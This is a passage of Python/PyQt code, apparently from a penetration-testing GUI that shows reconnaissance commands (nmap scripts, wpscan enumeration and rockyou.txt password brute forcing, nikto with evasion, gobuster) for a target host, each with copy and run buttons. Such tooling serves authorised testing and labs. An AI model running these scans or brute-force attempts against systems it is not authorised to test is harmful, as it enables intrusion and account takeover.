            self.nmapMethods_Scan1.deleteLater()
        self.nmapMethods_Scan1 = QLabel("nmap --script http-methods --script-args http-methods.url-path='/website'")
        self.nmapMethods_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )

        # nmapMethods_Scan1 copy button
        if hasattr(self, 'nmapMethods_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan1_Copy)
            self.nmapMethods_Scan1_Copy.deleteLater()
        self.nmapMethods_Scan1_Copy = QPushButton()
        self.nmapMethods_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmapMethods_Scan1_Copy.setFixedSize(QSize(20,20))
        self.nmapMethods_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmapMethods_Scan1.text()))
        self.nmapMethods_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan1 run button
        if hasattr(self, 'nmapMethods_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan1_Run)
            self.nmapMethods_Scan1_Run.deleteLater()
        self.nmapMethods_Scan1_Run = QPushButton()
        self.nmapMethods_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmapMethods_Scan1_Run.setFixedSize(QSize(20,20))
        command4 = self.nmapMethods_Scan1.text() + "; bash"
        self.nmapMethods_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command4]))
        self.nmapMethods_Scan1_Run.setStyleSheet(
        "*:hover{background: '#20C20e';}"
        )
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmapMethods_Scan1_Copy)
        label_layout.addWidget(self.nmapMethods_Scan1_Run)
        label_layout.addWidget(self.nmapMethods_Scan1)
        self.tab2_container_layout.insertLayout(1, label_layout)
        self.tab2_container_layout.addStretch()

        # nmap Methods Scan2
        if hasattr(self, 'nmapMethods_Scan2'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan2)
            self.nmapMethods_Scan2.deleteLater()
        self.nmapMethods_Scan2 = QLabel("nmap --script smb-enum-shares")
        self.nmapMethods_Scan2.setStyleSheet(
        "color: 'white';" +
        "font-size: 20px;" +
        "font-style: 'bold';"
        )
        # nmapMethods_Scan2 copy button
        if hasattr(self, 'nmapMethods_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan2_Copy)
            self.nmapMethods_Scan2_Copy.deleteLater()
        self.nmapMethods_Scan2_Copy = QPushButton()
        self.nmapMethods_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmapMethods_Scan2_Copy.setFixedSize(QSize(20,20))
        self.nmapMethods_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmapMethods_Scan2.text()))
        self.nmapMethods_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan2 run button
        if hasattr(self, 'nmapMethods_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan2_Run)
            self.nmapMethods_Scan2_Run.deleteLater()
        self.nmapMethods_Scan2_Run = QPushButton()
        self.nmapMethods_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmapMethods_Scan2_Run.setFixedSize(QSize(20,20))
        command5 = self.nmapMethods_Scan2.text() + "; bash"
        self.nmapMethods_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command5]))
        self.nmapMethods_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmapMethods_Scan2_Copy)
        label_layout.addWidget(self.nmapMethods_Scan2_Run)
        label_layout.addWidget(self.nmapMethods_Scan2)
        self.tab2_container_layout.insertLayout(2, label_layout)
   
        # nmapMethods_Scan3
        if hasattr(self, 'nmapMethods_Scan3'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan3)
            self.nmapMethods_Scan3.deleteLater()
        self.nmapMethods_Scan3 = QLabel(f"nmap -p{self.rport} --script=http-methods --script-args http-methods.url-path='/website'")
        self.nmapMethods_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # nmapMethods_Scan3 copy button
        if hasattr(self, 'nmapMethods_Scan3_Copy'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan3_Copy)
            self.nmapMethods_Scan3_Copy.deleteLater()
        self.nmapMethods_Scan3_Copy = QPushButton()
        self.nmapMethods_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nmapMethods_Scan3_Copy.setFixedSize(QSize(20,20))
        self.nmapMethods_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nmapMethods_Scan3.text()))
        self.nmapMethods_Scan3_Copy.setStyleSheet("*:hover{background: '#20C20e';}")
        
        # nmapMethods_Scan3 run button
        if hasattr(self, 'nmapMethods_Scan3_Run'):
            self.tab2_container_layout.removeWidget(self.nmapMethods_Scan3_Run)
            self.nmapMethods_Scan3_Run.deleteLater()
        self.nmapMethods_Scan3_Run = QPushButton()
        self.nmapMethods_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nmapMethods_Scan3_Run.setFixedSize(QSize(20,20))
        command6 = self.nmapMethods_Scan3.text() + "; bash"
        self.nmapMethods_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command6]))
        self.nmapMethods_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nmapMethods_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nmapMethods_Scan3_Copy)
        label_layout.addWidget(self.nmapMethods_Scan3_Run)
        label_layout.addWidget(self.nmapMethods_Scan3)
        self.tab2_container_layout.insertLayout(3, label_layout)
        self.tab2_container_layout.addStretch()

        # httpMethods_divider 1
        if hasattr(self, 'httpMethods_divider1'):
            self.tab2_container_layout.removeWidget(self.httpMethods_divider1)
            self.httpMethods_divider1.deleteLater()
        self.httpMethods_divider1 = QFrame()
        self.httpMethods_divider1.setFrameShape(QFrame.HLine)
        self.httpMethods_divider1.setLineWidth(3)
        self.httpMethods_divider1.setStyleSheet("color: #20C20E;")
        
        # httpMethods_divider2
        if hasattr(self, 'httpMethods_divider2'):
            self.tab2_container_layout.removeWidget(self.httpMethods_divider2)
            self.httpMethods_divider2.deleteLater()
        self.httpMethods_divider2 = QFrame()
        self.httpMethods_divider2.setFrameShape(QFrame.HLine)
        self.httpMethods_divider2.setLineWidth(3)
        self.httpMethods_divider2.setStyleSheet("color: #20C20E;")
        
        # httpMethods_spacer1
        if hasattr(self, 'httpMethods_spacer1'):
            self.tab2_container_layout.removeWidget(self.httpMethods_spacer1)
            self.httpMethods_spacer1.deleteLater()
        self.httpMethods_spacer1 = QLabel()
        self.httpMethods_spacer1.setFixedWidth(40)
        self.httpMethods_spacer1.setFixedHeight(50)
        
        # httpMethods_spacer2
        if hasattr(self, 'httpMethods_spacer2'):
            self.tab2_container_layout.removeWidget(self.httpMethods_spacer2)
            self.httpMethods_spacer2.deleteLater()
        self.httpMethods_spacer2 = QLabel()
        self.httpMethods_spacer2.setFixedWidth(40)
        self.httpMethods_spacer2.setFixedHeight(50)

        # httpMethods_spacer & divider layout
        self.tab2_container_layout.insertWidget(4, self.httpMethods_spacer1)
        self.tab2_container_layout.insertWidget(5, self.httpMethods_divider1)
        self.tab2_container_layout.insertWidget(6, self.httpMethods_divider2)
        self.tab2_container_layout.insertWidget(7, self.httpMethods_spacer2)
        self.tab2_container_layout.addStretch()
        
# WPScanSSL
        if hasattr(self, 'wpscanSSL'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL)
            self.wpscanSSL.deleteLater()
        self.wpscanSSL = QLabel("[+ WPScan & SSL]")
        self.wpscanSSL.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(8,self.wpscanSSL)

        # wpscanSSL Scan1
        if hasattr(self, 'wpscanSSL_Scan1'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_Scan1)
            self.wpscanSSL_Scan1.deleteLater()
        self.wpscanSSL_Scan1 = QLabel(f"wpscan --url http://{self.rhost}:{self.rport} --disable-tls-checks --enumerate p --enumerate t --enumerate u")
        self.wpscanSSL_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # wpscanSSL_Scan1 copy button
        if hasattr(self, 'wpscanSSL_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_Scan1_Copy)
            self.wpscanSSL_Scan1_Copy.deleteLater()
        self.wpscanSSL_Scan1_Copy = QPushButton()
        self.wpscanSSL_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpscanSSL_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpscanSSL_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpscanSSL_Scan1.text()))
        self.wpscanSSL_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanSSL_Scan1 run button
        if hasattr(self, 'wpscanSSL_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_Scan1_Run)
            self.wpscanSSL_Scan1_Run.deleteLater()
        self.wpscanSSL_Scan1_Run = QPushButton()
        self.wpscanSSL_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wpscanSSL_Scan1_Run.setFixedSize(QSize(20,20))
        command1 = self.wpscanSSL_Scan1.text() + "; bash"
        self.wpscanSSL_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        self.wpscanSSL_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanSSL_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpscanSSL_Scan1_Copy)
        label_layout.addWidget(self.wpscanSSL_Scan1_Run)
        label_layout.addWidget(self.wpscanSSL_Scan1)
        self.tab2_container_layout.insertLayout(9, label_layout)
        self.tab2_container_layout.addStretch()

        # wpscanSSL_spacer1
        if hasattr(self, 'wpscanSSL_spacer1'):
            self.tab2_container_layout.removeWidget(self.wpscanSSL_spacer1)
            self.wpscanSSL_spacer1.deleteLater()
        self.wpscanSSL_spacer1 = QLabel()
        self.wpscanSSL_spacer1.setFixedWidth(40)
        self.wpscanSSL_spacer1.setFixedHeight(20)

        # wpscanSSL_spacer & divider layout
        self.tab2_container_layout.insertWidget(10, self.wpscanSSL_spacer1)

# wpscanBF
        if hasattr(self, 'wpscanBF'):
            self.tab2_container_layout.removeWidget(self.wpscanBF)
            self.wpscanBF.deleteLater()
        self.wpscanBF = QLabel("[+ WPScan Brute Forcing:]")
        self.wpscanBF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(11,self.wpscanBF)

        # wpscanBF_Scan1
        if hasattr(self, 'wpscanBF_Scan1'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_Scan1)
            self.wpscanBF_Scan1.deleteLater()
        self.wpscanBF_Scan1 = QLabel(f"wpscan --url http://{self.rhost}:{self.rport} --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt")
        self.wpscanBF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wpscanBF_Scan1 copy button
        if hasattr(self, 'wpscanBF_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_Scan1_Copy)
            self.wpscanBF_Scan1_Copy.deleteLater()
        self.wpscanBF_Scan1_Copy = QPushButton()
        self.wpscanBF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpscanBF_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpscanBF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpscanBF_Scan1.text()))
        self.wpscanBF_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanBF_Scan1 run button
        if hasattr(self, 'wpscanBF_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_Scan1_Run)
            self.wpscanBF_Scan1_Run.deleteLater()
        self.wpscanBF_Scan1_Run = QPushButton()
        self.wpscanBF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wpscanBF_Scan1_Run.setFixedSize(QSize(20,20))
        command8 = self.wpscanBF_Scan1.text() + "; bash"
        self.wpscanBF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command8]))
        self.wpscanBF_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wpscanBF_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpscanBF_Scan1_Copy)
        label_layout.addWidget(self.wpscanBF_Scan1_Run)
        label_layout.addWidget(self.wpscanBF_Scan1)
        self.tab2_container_layout.insertLayout(12, label_layout)
        self.tab2_container_layout.addStretch()

        # wpscanBF_spacer1
        if hasattr(self, 'wpscanBF_spacer1'):
            self.tab2_container_layout.removeWidget(self.wpscanBF_spacer1)
            self.wpscanBF_spacer1.deleteLater()
        self.wpscanBF_spacer1 = QLabel()
        self.wpscanBF_spacer1.setFixedWidth(40)
        self.wpscanBF_spacer1.setFixedHeight(20)

        # wpscanBF_spacer & divider layout
        self.tab2_container_layout.insertWidget(13, self.wpscanBF_spacer1)

# wpscan Aggressive Plugin Detection
        if hasattr(self, 'wpscanAPD'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD)
            self.wpscanAPD.deleteLater()
        self.wpscanAPD = QLabel("[+ Aggressive Plugin Detection:]")
        self.wpscanAPD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(14,self.wpscanAPD)

        if hasattr(self, 'wpscanAPD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1)
            self.wpscanAPD_Scan1.deleteLater()
        self.wpscanAPD_Scan1 = QLabel("wpscan --url http:// " + self.rhost + ":" + self.rport + " --enumerate p --plugins-detection aggressive")
        self.wpscanAPD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
      
        if hasattr(self, 'wpscanAPD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1_Copy)
            self.wpscanAPD_Scan1_Copy.deleteLater()
        self.wpscanAPD_Scan1_Copy = QPushButton()
        self.wpscanAPD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wpscanAPD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wpscanAPD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wpscanAPD_Scan1.text()))
        self.wpscanAPD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
      
        if hasattr(self, 'wpscanAPD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1_Run)
            self.wpscanAPD_Scan1_Run.deleteLater()
        self.wpscanAPD_Scan1_Run = QPushButton()
        self.wpscanAPD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wpscanAPD_Scan1_Run.setFixedSize(QSize(20,20))
        command9 = self.wpscanAPD_Scan1.text() + "; bash"
        self.wpscanAPD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command9]))
        self.wpscanAPD_Scan1_Run.setStyleSheet("*:hover{background: '#20C20e';}")
        
        # wpscanAPD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wpscanAPD_Scan1_Copy)
        label_layout.addWidget(self.wpscanAPD_Scan1_Run)
        label_layout.addWidget(self.wpscanAPD_Scan1)
        self.tab2_container_layout.insertLayout(15, label_layout)
        self.tab2_container_layout.addStretch()

        # wpscan_divider 1
        if hasattr(self, 'wpscan_divider1'):
            self.tab2_container_layout.removeWidget(self.wpscan_divider1)
            self.wpscan_divider1.deleteLater()
        self.wpscan_divider1 = QFrame()
        self.wpscan_divider1.setFrameShape(QFrame.HLine)
        self.wpscan_divider1.setLineWidth(3)
        self.wpscan_divider1.setStyleSheet("color: #20C20E;")
        
        # wpscan_divider2
        if hasattr(self, 'wpscan_divider2'):
            self.tab2_container_layout.removeWidget(self.wpscan_divider2)
            self.wpscan_divider2.deleteLater()
        self.wpscan_divider2 = QFrame()
        self.wpscan_divider2.setFrameShape(QFrame.HLine)
        self.wpscan_divider2.setLineWidth(3)
        self.wpscan_divider2.setStyleSheet("color: #20C20E;")
        
        # wpscan_spacer1
        if hasattr(self, 'wpscan_spacer1'):
            self.tab2_container_layout.removeWidget(self.wpscan_spacer1)
            self.wpscan_spacer1.deleteLater()
        self.wpscan_spacer1 = QLabel()
        self.wpscan_spacer1.setFixedWidth(40)
        self.wpscan_spacer1.setFixedHeight(50)

        # wpscan_spacer2
        if hasattr(self, 'wpscan_spacer2'):
            self.tab2_container_layout.removeWidget(self.wpscan_spacer2)
            self.wpscan_spacer2.deleteLater()
        self.wpscan_spacer2 = QLabel()
        self.wpscan_spacer2.setFixedWidth(40)
        self.wpscan_spacer2.setFixedHeight(50)

        # wpscan_spacer & divider layout
        self.tab2_container_layout.insertWidget(16, self.wpscan_spacer1)
        self.tab2_container_layout.insertWidget(17, self.wpscan_divider1)
        self.tab2_container_layout.insertWidget(18, self.wpscan_divider2)
        self.tab2_container_layout.insertWidget(19, self.wpscan_spacer2)
        self.tab2_container_layout.addStretch()

        # niktoSE
        if hasattr(self, 'niktoSE'):
            self.tab2_container_layout.removeWidget(self.niktoSE)
            self.niktoSE.deleteLater()
        self.niktoSE = QLabel("[+ Nikto with SSL and Evasion:]")
        self.niktoSE.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(20,self.niktoSE)

        # niktoSE_Scan1
        if hasattr(self, 'niktoSE_Scan1'):
            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1)
            self.niktoSE_Scan1.deleteLater()
        self.niktoSE_Scan1 = QLabel(f"nikto --host http://{self.rhost}:{self.rport} -ssl -evasion 1")
        self.niktoSE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # niktoSE_Scan1 copy button
        if hasattr(self, 'niktoSE_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1_Copy)
            self.niktoSE_Scan1_Copy.deleteLater()
        self.niktoSE_Scan1_Copy = QPushButton()
        self.niktoSE_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.niktoSE_Scan1_Copy.setFixedSize(QSize(20,20))
        self.niktoSE_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.niktoSE_Scan1.text()))
        self.niktoSE_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # niktoSE_Scan1 run button
        if hasattr(self, 'niktoSE_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1_Run)
            self.niktoSE_Scan1_Run.deleteLater()
        self.niktoSE_Scan1_Run = QPushButton()
        self.niktoSE_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.niktoSE_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.niktoSE_Scan1.text() + "; bash"
        self.niktoSE_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.niktoSE_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # niktoSE_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.niktoSE_Scan1_Copy)
        label_layout.addWidget(self.niktoSE_Scan1_Run)
        label_layout.addWidget(self.niktoSE_Scan1)
        self.tab2_container_layout.insertLayout(21, label_layout)
        self.tab2_container_layout.addStretch()

        # niktoSE_spacer1
        if hasattr(self, 'niktoSE_spacer1'):
            self.tab2_container_layout.removeWidget(self.niktoSE_spacer1)
            self.niktoSE_spacer1.deleteLater()
        self.niktoSE_spacer1 = QLabel()
        self.niktoSE_spacer1.setFixedWidth(40)
        self.niktoSE_spacer1.setFixedHeight(20)

        # niktoSE_spacer & divider layout
        self.tab2_container_layout.insertWidget(22, self.niktoSE_spacer1)

# nikto
        if hasattr(self, 'nikto'):
            self.tab2_container_layout.removeWidget(self.nikto)
            self.nikto.deleteLater()
        self.nikto = QLabel("[+ Nikto Standard:]")
        self.nikto.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(23,self.nikto)

        # nikto_Scan1
        if hasattr(self, 'nikto_Scan1'):
            self.tab2_container_layout.removeWidget(self.nikto_Scan1)
            self.nikto_Scan1.deleteLater()
        self.nikto_Scan1 = QLabel(f"nikto --host http://{self.rhost}:{self.rport} -C all")
        self.nikto_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # nikto_Scan1 copy button
        if hasattr(self, 'nikto_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.nikto_Scan1_Copy)
            self.nikto_Scan1_Copy.deleteLater()
        self.nikto_Scan1_Copy = QPushButton()
        self.nikto_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.nikto_Scan1_Copy.setFixedSize(QSize(20,20))
        self.nikto_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nikto_Scan1.text()))
        self.nikto_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nikto_Scan1 run button
        if hasattr(self, 'nikto_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.nikto_Scan1_Run)
            self.nikto_Scan1_Run.deleteLater()
        self.nikto_Scan1_Run = QPushButton()
        self.nikto_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.nikto_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.nikto_Scan1.text() + "; bash"
        self.nikto_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.nikto_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # nikto_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.nikto_Scan1_Copy)
        label_layout.addWidget(self.nikto_Scan1_Run)
        label_layout.addWidget(self.nikto_Scan1)
        self.tab2_container_layout.insertLayout(24, label_layout)
        self.tab2_container_layout.addStretch()

        # nikto_divider1 
        if hasattr(self, 'nikto_divider1'):
            self.tab2_container_layout.removeWidget(self.nikto_divider1)
            self.nikto_divider1.deleteLater()
        self.nikto_divider1 = QFrame()
        self.nikto_divider1.setFrameShape(QFrame.HLine)
        self.nikto_divider1.setLineWidth(3)
        self.nikto_divider1.setStyleSheet("color: #20C20E;")
        
        # nikto_divider2
        if hasattr(self, 'nikto_divider2'):
            self.tab2_container_layout.removeWidget(self.nikto_divider2)
            self.nikto_divider2.deleteLater()
        self.nikto_divider2 = QFrame()
        self.nikto_divider2.setFrameShape(QFrame.HLine)
        self.nikto_divider2.setLineWidth(3)
        self.nikto_divider2.setStyleSheet("color: #20C20E;")
        
        # nikto_spacer1
        if hasattr(self, 'nikto_spacer1'):
            self.tab2_container_layout.removeWidget(self.nikto_spacer1)
            self.nikto_spacer1.deleteLater()
        self.nikto_spacer1 = QLabel()
        self.nikto_spacer1.setFixedWidth(40)
        self.nikto_spacer1.setFixedHeight(50)
        
        # nikto_spacer2
        if hasattr(self, 'nikto_spacer2'):
            self.tab2_container_layout.removeWidget(self.nikto_spacer2)
            self.nikto_spacer2.deleteLater()
        self.nikto_spacer2 = QLabel()
        self.nikto_spacer2.setFixedWidth(40)
        self.nikto_spacer2.setFixedHeight(50)

        # nikto_spacer & divider layout
        self.tab2_container_layout.insertWidget(25, self.nikto_spacer1)
        self.tab2_container_layout.insertWidget(26, self.nikto_divider1)
        self.tab2_container_layout.insertWidget(27, self.nikto_divider2)
        self.tab2_container_layout.insertWidget(28, self.nikto_spacer2)
        self.tab2_container_layout.addStretch()

# gobusterDir
        if hasattr(self, 'gobusterDir'):
            self.tab2_container_layout.removeWidget(self.gobusterDir)
            self.gobusterDir.deleteLater()
        self.gobusterDir = QLabel("[+ Gobuster Directory]")
        self.gobusterDir.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(29,self.gobusterDir)

        # gobusterDir_Scan1
        if hasattr(self, 'gobusterDir_Scan1'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1)
            self.gobusterDir_Scan1.deleteLater()
        self.gobusterDir_Scan1 = QLabel(f"gobuster dir -u http://{self.rhost}:{self.rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30")
        self.gobusterDir_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # gobusterDir_Scan1 copy button
        if hasattr(self, 'gobusterDir_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1_Copy)
            self.gobusterDir_Scan1_Copy.deleteLater()
        self.gobusterDir_Scan1_Copy = QPushButton()
        self.gobusterDir_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.gobusterDir_Scan1_Copy.setFixedSize(QSize(20,20))
        self.gobusterDir_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterDir_Scan1.text()))
        self.gobusterDir_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterDir_Scan1 run button
        if hasattr(self, 'gobusterDir_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1_Run)
            self.gobusterDir_Scan1_Run.deleteLater()
        self.gobusterDir_Scan1_Run = QPushButton()
        self.gobusterDir_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.gobusterDir_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.gobusterDir_Scan1.text() + "; bash"
        self.gobusterDir_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.gobusterDir_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterDir_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.gobusterDir_Scan1_Copy)
        label_layout.addWidget(self.gobusterDir_Scan1_Run)
        label_layout.addWidget(self.gobusterDir_Scan1)
        self.tab2_container_layout.insertLayout(30, label_layout)
        self.tab2_container_layout.addStretch()

        # gobusterDir_spacer1
        if hasattr(self, 'gobusterDir_spacer1'):
            self.tab2_container_layout.removeWidget(self.gobusterDir_spacer1)
            self.gobusterDir_spacer1.deleteLater()
        self.gobusterDir_spacer1 = QLabel()
        self.gobusterDir_spacer1.setFixedWidth(40)
        self.gobusterDir_spacer1.setFixedHeight(20)

        # gobusterDir_spacer & divider layout
        self.tab2_container_layout.insertWidget(31, self.gobusterDir_spacer1)

# gobusterFiles
        if hasattr(self, 'gobusterFiles'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles)
            self.gobusterFiles.deleteLater()
        self.gobusterFiles = QLabel("[+ Gobuster Files]")
        self.gobusterFiles.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(32,self.gobusterFiles)

        # gobusterFiles_Scan1
        if hasattr(self, 'gobusterFiles_Scan1'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1)
            self.gobusterFiles_Scan1.deleteLater()
        self.gobusterFiles_Scan1 = QLabel(f"gobuster dir -u http://{self.rhost}:{self.rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30")
        self.gobusterFiles_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # gobusterFiles_Scan1 copy button
        if hasattr(self, 'gobusterFiles_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1_Copy)
            self.gobusterFiles_Scan1_Copy.deleteLater()
        self.gobusterFiles_Scan1_Copy = QPushButton()
        self.gobusterFiles_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.gobusterFiles_Scan1_Copy.setFixedSize(QSize(20,20))
        self.gobusterFiles_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterFiles_Scan1.text()))
        self.gobusterFiles_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterFiles_Scan1 run button
        if hasattr(self, 'gobusterFiles_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1_Run)
            self.gobusterFiles_Scan1_Run.deleteLater()
        self.gobusterFiles_Scan1_Run = QPushButton()
        self.gobusterFiles_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.gobusterFiles_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.gobusterFiles_Scan1.text() + "; bash"
